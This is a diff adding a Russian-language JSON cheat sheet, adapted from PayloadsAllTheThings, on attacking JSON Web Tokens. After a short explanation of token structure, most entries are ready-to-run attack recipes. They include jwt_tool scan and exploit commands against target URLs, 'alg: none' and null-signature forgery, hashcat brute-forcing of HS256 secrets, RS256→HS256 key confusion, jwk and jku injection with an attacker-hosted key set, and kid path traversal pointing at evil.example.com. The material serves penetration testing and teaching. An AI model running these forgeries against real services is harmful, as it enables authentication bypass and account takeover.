@@ -1,0 +1,333 @@
+{
+  "category": "JSON Web Token",
+  "source": "PayloadsAllTheThings/JSON Web Token/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое JWT и где искать",
+      "language": "text",
+      "tags": ["methodology", "jwt", "recon"],
+      "body": "JSON Web Token (JWT, RFC 7519) — компактный самодостаточный способ безопасно передавать данные между сторонами в виде JSON-объекта. Данные подписаны цифровой подписью, поэтому им можно доверять.\n• Токен ищи в cookie, заголовке Authorization: Bearer, в теле ответа после логина, в localStorage/sessionStorage.\n• Узнаётся по характерной структуре из трёх Base64URL-частей, разделённых точками, и почти всегда начинается с eyJ (это Base64 от {\")."
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Формат JWT — три части",
+      "language": "text",
+      "tags": ["structure", "format"],
+      "body": "JSON Web Token: Base64(Header).Base64(Data).Base64(Signature)\n\nПример:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY\n\nРазбивается на 3 компонента, разделённых точкой:\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header\neyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload\nUL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature"
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Header — базовый вид",
+      "language": "json",
+      "tags": ["structure", "header"],
+      "body": "{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}"
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Параметры заголовка (RFC 7515)",
+      "language": "table",
+      "tags": ["structure", "header"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Параметр", "Расшифровка", "Описание"],
+          "rows": [
+            ["alg", "Algorithm", "Криптоалгоритм, которым защищён JWS"],
+            ["jku", "JWK Set URL", "Ссылка на ресурс с набором JSON-публичных ключей"],
+            ["jwk", "JSON Web Key", "Публичный ключ, использованный для подписи JWS"],
+            ["kid", "Key ID", "Идентификатор ключа, которым защищён JWS"],
+            ["x5u", "X.509 URL", "URL сертификата X.509 или цепочки сертификатов"],
+            ["x5c", "X.509 Certificate Chain", "Сертификат X.509 / цепочка в PEM, использованные для подписи JWS"],
+            ["x5t", "X.509 Certificate SHA-1 Thumbprint", "Base64url SHA-1 отпечаток DER-кодировки сертификата X.509"],
+            ["x5t#S256", "X.509 Certificate SHA-256 Thumbprint", "Base64url SHA-256 отпечаток DER-кодировки сертификата X.509"],
+            ["typ", "Type", "Медиа-тип. Обычно JWT"],
+            ["cty", "Content Type", "Использовать не рекомендуется"],
+            ["crit", "Critical", "Используются расширения и/или JWA"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Значения alg — алгоритмы подписи",
+      "language": "table",
+      "tags": ["structure", "alg"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["alg", "Алгоритм подписи или MAC", "Требование"],
+          "rows": [
+            ["HS256", "HMAC using SHA-256", "Required"],
+            ["HS384", "HMAC using SHA-384", "Optional"],
+            ["HS512", "HMAC using SHA-512", "Optional"],
+            ["RS256", "RSASSA-PKCS1-v1_5 using SHA-256", "Recommended"],
+            ["RS384", "RSASSA-PKCS1-v1_5 using SHA-384", "Optional"],
+            ["RS512", "RSASSA-PKCS1-v1_5 using SHA-512", "Optional"],
+            ["ES256", "ECDSA using P-256 and SHA-256", "Recommended"],
+            ["ES384", "ECDSA using P-384 and SHA-384", "Optional"],
+            ["ES512", "ECDSA using P-521 and SHA-512", "Optional"],
+            ["PS256", "RSASSA-PSS using SHA-256 and MGF1 with SHA-256", "Optional"],
+            ["PS384", "RSASSA-PSS using SHA-384 and MGF1 with SHA-384", "Optional"],
+            ["PS512", "RSASSA-PSS using SHA-512 and MGF1 with SHA-512", "Optional"],
+            ["none", "No digital signature or MAC performed", "Required"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Алгоритм по умолчанию",
+      "language": "text",
+      "tags": ["structure", "alg"],
+      "body": "По умолчанию алгоритм \"HS256\" (HMAC SHA256, симметричное шифрование).\n\"RS256\" применяется для асимметричных целей (RSA: шифрование публичным ключом и подпись приватным).\n• HS256 использует секретный ключ и для подписи, и для проверки каждого сообщения.\n• RS256 подписывает приватным ключом, а проверяет публичным."
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Payload — пример и claims",
+      "language": "json",
+      "tags": ["structure", "payload", "claims"],
+      "body": "{\n    \"sub\":\"1234567890\",\n    \"name\":\"Amazing Haxx0r\",\n    \"exp\":\"1466270722\",\n    \"admin\":true\n}"
+    },
+    {
+      "subcategory": "Структура",
+      "title": "Зарезервированные claims",
+      "language": "text",
+      "tags": ["structure", "claims"],
+      "body": "iss — издатель токена (issuer).\nexp — срок истечения (Unix-время в секундах); просроченные токены отклоняются.\niat — время выпуска JWT; по нему определяют возраст токена.\nnbf — \"not before\": момент в будущем, с которого токен станет активным.\njti — уникальный идентификатор JWT; защищает от повторного использования (replay).\nsub — субъект токена (используется редко).\naud — аудитория токена (тоже используется редко)."
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "Тулзы для атак на JWT",
+      "language": "text",
+      "tags": ["tools"],
+      "body": "ticarpi/jwt_tool — набор для тестирования, модификации и взлома JWT.\nbrendan-rius/c-jwt-cracker — брутфорс-кракер JWT на C.\nPortSwigger/JOSEPH — Burp-расширение для пентеста JOSE (подпись/шифрование).\nportswigger/JWT Editor — Burp-расширение для редактирования и подписи JWT.\njwt.io — онлайн энкодер/декодер."
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "jwt_tool — recon, сканирование, эксплуатация",
+      "language": "bash",
+      "tags": ["jwt-tool", "recon", "scan"],
+      "body": "# Recon — разобрать токен\npython3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw\n\n# Scanning (playbook all-tests)\npython3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -M pb\n\n# Exploitation\npython3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -X i -I -pc name -pv admin\n\n# Fuzzing kid\npython3 jwt_tool.py -t https://www.ticarpi.com/ -rc \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test\" -I -hc kid -hv custom_sqli_vectors.txt"
+    },
+    {
+      "subcategory": "Инструменты",
+      "title": "jwt_tool — инъекция заголовков и claims",
+      "language": "bash",
+      "tags": ["jwt-tool", "header", "payload"],
+      "body": "# Внедрить заголовки\npython3 jwt_tool.py JWT_HERE -I -hc header1 -hv testval1 -hc header2 -hv testval2\n\n# Внедрить claim в payload\npython3 jwt_tool.py JWT_HERE -I -pc payload1 -pv testval3"
+    },
+    {
+      "subcategory": "alg: none",
+      "title": "None Algorithm (CVE-2015-9235)",
+      "language": "text",
+      "tags": ["alg-none", "cve-2015-9235", "bypass"],
+      "body": "JWT поддерживает алгоритм None для подписи (вероятно, введён для отладки). Это может критически снизить безопасность приложения.\n\nВарианты написания alg:\nnone\nNone\nNONE\nnOnE\n\nЧтобы проэксплуатировать: декодируй JWT, поменяй алгоритм подписи. Это НЕ сработает, пока ты не УДАЛИШЬ саму подпись. Альтернативно можно модифицировать существующий JWT (осторожно со сроком exp)."
+    },
+    {
+      "subcategory": "alg: none",
+      "title": "None — эксплуатация через jwt_tool",
+      "language": "bash",
+      "tags": ["alg-none", "jwt-tool"],
+      "body": "python3 jwt_tool.py [JWT_HERE] -X a"
+    },
+    {
+      "subcategory": "alg: none",
+      "title": "None — ручная сборка токена (PyJWT)",
+      "language": "python",
+      "tags": ["alg-none", "pyjwt"],
+      "body": "import jwt\n\njwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'\ndecodedToken = jwt.decode(jwtToken, verify=False)       \n\n# decode the token before encoding with type 'None'\nnoneEncoded = jwt.encode(decodedToken, key='', algorithm=None)\n\nprint(noneEncoded.decode())"
+    },
+    {
+      "subcategory": "Слабый секрет",
+      "title": "Где искать секрет и словарь готовых",
+      "language": "text",
+      "tags": ["weak-secret", "bruteforce", "wordlist"],
+      "body": "Чтобы создать JWT, секретный ключ подписывает header и payload. Если атакующий получит секрет, он сможет создавать, изменять и подписывать собственные токены, обходя контроль доступа.\n\nПолезный список из 3502 публично известных JWT-секретов: wallarm/jwt-secrets/jwt.secrets.list — включает your_jwt_secret, change_this_super_secret_random_string и т.п.\nПодпись слабым/коротким секретом (HS256) брутфорсится оффлайн — это первое, что стоит проверить."
+    },
+    {
+      "subcategory": "Слабый секрет",
+      "title": "Брутфорс секрета через jwt_tool",
+      "language": "bash",
+      "tags": ["weak-secret", "jwt-tool", "bruteforce"],
+      "body": "python3 -m pip install termcolor cprint pycryptodomex requests\npython3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C"
+    },
+    {
+      "subcategory": "Слабый секрет",
+      "title": "Брутфорс секрета через hashcat (mode 16500)",
+      "language": "bash",
+      "tags": ["weak-secret", "hashcat", "bruteforce"],
+      "body": "# Атака по словарю\nhashcat -a 0 -m 16500 jwt.txt wordlist.txt\n\n# Атака по словарю с правилами\nhashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule\n\n# Полный перебор (маска)\nhashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6"
+    },
+    {
+      "subcategory": "Слабый секрет",
+      "title": "Кодирование/декодирование JWT с известным секретом",
+      "language": "python",
+      "tags": ["weak-secret", "pyjwt", "sign"],
+      "body": "# pip install pyjwt\nimport jwt\nencoded = jwt.encode({'some': 'payload'}, 'secret', algorithm='HS256')\njwt.decode(encoded, 'secret', algorithms=['HS256'])"
+    },
+    {
+      "subcategory": "Слабый секрет",
+      "title": "Декодирование токена в jwt_tool (-T)",
+      "language": "bash",
+      "tags": ["weak-secret", "jwt-tool", "decode"],
+      "body": "jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds\njwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSm9obiBEb2UifQ.xuEv8qrfXu424LZk8bVgr9MQJUIrp1rHcPyZw_KSsds -T\n\nToken header values:\n[+] alg = \"HS256\"\n[+] typ = \"JWT\"\n\nToken payload values:\n[+] name = \"John Doe\""
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Суть атаки (CVE-2016-5431)",
+      "language": "text",
+      "tags": ["key-confusion", "cve-2016-5431", "rs256", "hs256"],
+      "body": "Если код сервера ждёт токен с alg=RSA, но получает токен с alg=HMAC, он может по ошибке использовать ПУБЛИЧНЫЙ ключ как симметричный HMAC-секрет при проверке подписи.\nТак как публичный ключ нередко доступен атакующему, он меняет алгоритм в заголовке на HS256 и подписывает данные RSA-публичным ключом. Когда приложение использует ту же пару RSA-ключей, что и TLS веб-сервер, ключ берётся так:\nopenssl s_client -connect example.com:443 | openssl x509 -pubkey -noout"
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Подпись публичным ключом как HMAC (PyJWT)",
+      "language": "python",
+      "tags": ["key-confusion", "pyjwt", "sign"],
+      "body": "import jwt\npublic = open('public.pem', 'r').read()\nprint public\nprint jwt.encode({\"data\":\"test\"}, key=public, algorithm='HS256')"
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Предупреждение про фикс в PyJWT",
+      "language": "text",
+      "tags": ["key-confusion", "pyjwt"],
+      "body": "Это поведение исправлено в библиотеке Python и теперь вернёт ошибку:\njwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.\nДля воспроизведения нужна старая версия: pip install pyjwt==0.4.3"
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Эксплуатация через jwt_tool",
+      "language": "bash",
+      "tags": ["key-confusion", "jwt-tool"],
+      "body": "python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem"
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Через JWT Editor (Burp) — шаги",
+      "language": "text",
+      "tags": ["key-confusion", "jwt-editor", "burp"],
+      "body": "1. Найди публичный ключ, обычно в /jwks.json или /.well-known/jwks.json.\n2. Загрузи его на вкладке JWT Editor Keys → New RSA Key.\n3. В диалоге вставь полученный ранее JWK: {\"kty\":\"RSA\",\"e\":\"AQAB\",\"use\":\"sig\",\"kid\":\"961a...85ce\",\"alg\":\"RS256\",\"n\":\"16aflvW6...UGLQ\"}\n4. Выбери радиокнопку PEM и скопируй полученный PEM-ключ.\n5. На вкладке Decoder сделай Base64-кодирование PEM.\n6. Вернись в JWT Editor Keys и сгенерируй New Symmetric Key в формате JWK.\n7. Замени значение параметра k на Base64-PEM, который только что скопировал.\n8. Поменяй alg токена на HS256 и отредактируй данные.\n9. Нажми Sign и оставь опцию Don't modify header."
+    },
+    {
+      "subcategory": "Key Confusion RS256→HS256",
+      "title": "Ручное превращение RS256 в HS256",
+      "language": "bash",
+      "tags": ["key-confusion", "manual", "openssl"],
+      "body": "# 1. Перевести публичный ключ (key.pem) в HEX\ncat key.pem | xxd -p | tr -d \"\\\\n\"\n2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n\n# 2. Сгенерировать HMAC-подпись, подав публичный ключ как ASCII-hex, для ранее отредактированного токена\necho -n \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ\" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e20505[STRIPPED]592d2d2d2d2d0a\n(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0\n\n# 3. Перевести подпись (Hex в base64 URL)\npython2 -c \"exec(\\\"import base64, binascii\\nprint base64.urlsafe_b64encode(binascii.a2b_hex('8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0')).replace('=','')\\\")\"\n\n# 4. Добавить подпись к отредактированному payload\n[HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE]\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA"
+    },
+    {
+      "subcategory": "Key Injection (jwk)",
+      "title": "Суть атаки (CVE-2018-0114)",
+      "language": "text",
+      "tags": ["key-injection", "jwk", "cve-2018-0114", "header-injection"],
+      "body": "Уязвимость в Cisco node-jose до 0.11.0 позволяла неаутентифицированному удалённому атакующему пере-подписывать токены ключом, встроенным в сам токен. Стандарт JWS допускает встраивание публичного ключа (JWK) в заголовок JWS, и этот ключ затем доверяется при проверке. Атакующий подделывает валидные JWS: удаляет исходную подпись, добавляет свой публичный ключ в заголовок и подписывает объект своим (контролируемым им) приватным ключом."
+    },
+    {
+      "subcategory": "Key Injection (jwk)",
+      "title": "Эксплуатация через jwt_tool / JWT Editor",
+      "language": "bash",
+      "tags": ["key-injection", "jwt-tool", "jwk"],
+      "body": "# jwt_tool: встроить jwk и пере-подписать\npython3 jwt_tool.py [JWT_HERE] -X i\n\n# JWT Editor (Burp):\n# 1. Add a New RSA key\n# 2. В Repeater на вкладке JWT отредактируй data\n# 3. Attack > Embedded JWK"
+    },
+    {
+      "subcategory": "Key Injection (jwk)",
+      "title": "Разобранный токен со встроенным jwk",
+      "language": "json",
+      "tags": ["key-injection", "jwk", "header"],
+      "body": "{\n  \"alg\": \"RS256\",\n  \"typ\": \"JWT\",\n  \"jwk\": {\n    \"kty\": \"RSA\",\n    \"kid\": \"jwt_tool\",\n    \"use\": \"sig\",\n    \"e\": \"AQAB\",\n    \"n\": \"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw\"\n  }\n}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key injected]"
+    },
+    {
+      "subcategory": "jku header injection",
+      "title": "Суть атаки и где искать JWKS",
+      "language": "text",
+      "tags": ["jku", "jwks", "header-injection"],
+      "body": "Значение заголовка jku указывает на URL JWKS-файла. Заменив jku на подконтрольный атакующему URL с его публичным ключом, можно подписать токен своим приватным ключом — сервис скачает вредоносный публичный ключ и проверит подпись успешно.\n\nJWKS иногда публично доступен по стандартным эндпоинтам:\n/jwks.json\n/.well-known/jwks.json\n/openid/connect/jwks.json\n/api/keys\n/api/v1/keys\n/{tenant}/oauth2/v1/certs\n\nДля атаки создай собственную пару ключей и захости свой JWKS."
+    },
+    {
+      "subcategory": "jku header injection",
+      "title": "Собственный JWKS-файл",
+      "language": "json",
+      "tags": ["jku", "jwks", "key"],
+      "body": "{\n    \"keys\": [\n        {\n            \"kid\": \"beaefa6f-8a50-42b9-805a-0ab63c3acc54\",\n            \"kty\": \"RSA\",\n            \"e\": \"AQAB\",\n            \"n\": \"nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ\"\n        }\n    ]\n}"
+    },
+    {
+      "subcategory": "jku header injection",
+      "title": "Эксплуатация через jwt_tool / JWT Editor",
+      "language": "bash",
+      "tags": ["jku", "jwt-tool", "jwks"],
+      "body": "# jwt_tool\npython3 jwt_tool.py JWT_HERE -X s\npython3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json\n\n# JWT Editor (Burp):\n# 1. Сгенерируй новый RSA-ключ и захости его\n# 2. Отредактируй data токена\n# 3. Замени заголовок kid на тот, что из твоего JWKS\n# 4. Добавь заголовок jku и подпиши JWT (опция Don't modify header должна быть включена)"
+    },
+    {
+      "subcategory": "jku header injection",
+      "title": "Разобранный токен с jku",
+      "language": "json",
+      "tags": ["jku", "header"],
+      "body": "{\"typ\":\"JWT\",\"alg\":\"RS256\", \"jku\":\"https://example.com/jwks.json\", \"kid\":\"id_of_jwks\"}.\n{\"login\":\"admin\"}.\n[Signed with new Private key; Public key exported]"
+    },
+    {
+      "subcategory": "kid claim misuse",
+      "title": "Суть и варианты эксплуатации kid",
+      "language": "text",
+      "tags": ["kid", "header-injection", "path-traversal"],
+      "body": "Claim kid (key ID) — необязательный параметр заголовка, указывающий идентификатор ключа, которым подписан/зашифрован JWT. Сам по себе он не даёт безопасности, а лишь помогает получателю найти нужный ключ. Содержимое файла, указанного в kid, используется для генерации подписи.\n\nТипичные способы злоупотребления kid:\n• Получить содержимое ключа, чтобы поменять payload.\n• Подменить путь к ключу на свой.\n• Подменить путь на файл с предсказуемым содержимым.\n• Внедрить в kid SQL- и Command-инъекции."
+    },
+    {
+      "subcategory": "kid claim misuse",
+      "title": "kid — локальный и удалённый файл ключа",
+      "language": "json",
+      "tags": ["kid", "header", "lfi", "ssrf"],
+      "body": "// Пример #1: локальный файл\n{\n\"alg\": \"HS256\",\n\"typ\": \"JWT\",\n\"kid\": \"/root/res/keys/secret.key\"\n}\n\n// Пример #2: удалённый файл\n{\n    \"alg\":\"RS256\",\n    \"typ\":\"JWT\",\n    \"kid\":\"http://localhost:7070/privKey.key\"\n}"
+    },
+    {
+      "subcategory": "kid claim misuse",
+      "title": "kid — подмена пути на свой ключ (PyJWT)",
+      "language": "python",
+      "tags": ["kid", "pyjwt", "sign"],
+      "body": ">>> jwt.encode(\n...     {\"some\": \"payload\"},\n...     \"secret\",\n...     algorithm=\"HS256\",\n...     headers={\"kid\": \"http://evil.example.com/custom.key\"},\n... )"
+    },
+    {
+      "subcategory": "kid claim misuse",
+      "title": "kid — путь на файл с предсказуемым содержимым",
+      "language": "bash",
+      "tags": ["kid", "jwt-tool", "path-traversal"],
+      "body": "python3 jwt_tool.py <JWT> -I -hc kid -hv \"../../dev/null\" -S hs256 -p \"\"\npython3 jwt_tool.py <JWT> -I -hc kid -hv \"/proc/sys/kernel/randomize_va_space\" -S hs256 -p \"2\""
+    },
+    {
+      "subcategory": "Восстановление публичного ключа",
+      "title": "Recover Public Key из двух подписанных JWT",
+      "language": "text",
+      "tags": ["recover-key", "rs256", "publickey"],
+      "body": "Алгоритмы RS256, RS384 и RS512 используют RSA с PKCS#1 v1.5 padding. Свойство: имея два разных сообщения с подписями, можно вычислить публичный ключ.\nЭто полезно, когда публичный ключ нигде не опубликован, но нужен для атаки key confusion (RS256→HS256).\nSecuraBV/jws2pubkey — вычисляет RSA-публичный ключ из двух подписанных JWT."
+    },
+    {
+      "subcategory": "Восстановление публичного ключа",
+      "title": "jws2pubkey — запуск",
+      "language": "bash",
+      "tags": ["recover-key", "jws2pubkey", "docker"],
+      "body": "docker run -it ttervoort/jws2pubkey JWS1 JWS2\ndocker run -it ttervoort/jws2pubkey \"$(cat sample-jws/sample1.txt)\" \"$(cat sample-jws/sample2.txt)\" | tee pubkey.jwk\nComputing public key. This may take a minute...\n{\"kty\": \"RSA\", \"n\": \"sEFRQzskiSOrUYiaWAPUMF66YOxWymrbf6PQqnCdnUla8PwI4KDVJ2XgNGg9XOdc-jRICmpsLVBqW4bag8eIh35PClTwYiHzV5cbyW6W5hXp747DQWan5lIzoXAmfe3Ydw65cXnanjAxz8vqgOZP2ptacwxyUPKqvM4ehyaapqxkBbSmhba6160PEMAr4d1xtRJx6jCYwQRBBvZIRRXlLe9hrohkblSrih8MdvHWYyd40khrPU9B2G_PHZecifKiMcXrv7IDaXH-H_NbS7jT5eoNb9xG8K_j7Hc9mFHI7IED71CNkg9RlxuHwELZ6q-9zzyCCcS426SfvTCjnX0hrQ\", \"e\": \"AQAB\"}"
+    },
+    {
+      "subcategory": "Disclosure подписи",
+      "title": "Раскрытие корректной подписи (CVE-2019-7644)",
+      "language": "text",
+      "tags": ["signature-disclosure", "cve-2019-7644"],
+      "body": "Отправь JWT с НЕВЕРНОЙ подписью — эндпоинт может вернуть ошибку, в которой раскроет правильную подпись (Expected ... got ...). Дальше эту подпись можно использовать для форджа токена.\n\nПримеры таких ошибок:\nInvalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs\nInvalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo="
+    },
+    {
+      "subcategory": "Null Signature",
+      "title": "Null Signature Attack (CVE-2020-28042)",
+      "language": "text",
+      "tags": ["null-signature", "cve-2020-28042", "bypass"],
+      "body": "Отправь JWT с алгоритмом HS256 БЕЗ подписи (часть после второй точки пустая):\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.\n\nРазобранный токен:\n{\"alg\":\"HS256\",\"typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}"
+    },
+    {
+      "subcategory": "Null Signature",
+      "title": "Эксплуатация через jwt_tool",
+      "language": "bash",
+      "tags": ["null-signature", "jwt-tool"],
+      "body": "python3 jwt_tool.py JWT_HERE -X n"
+    }
+  ]
+}
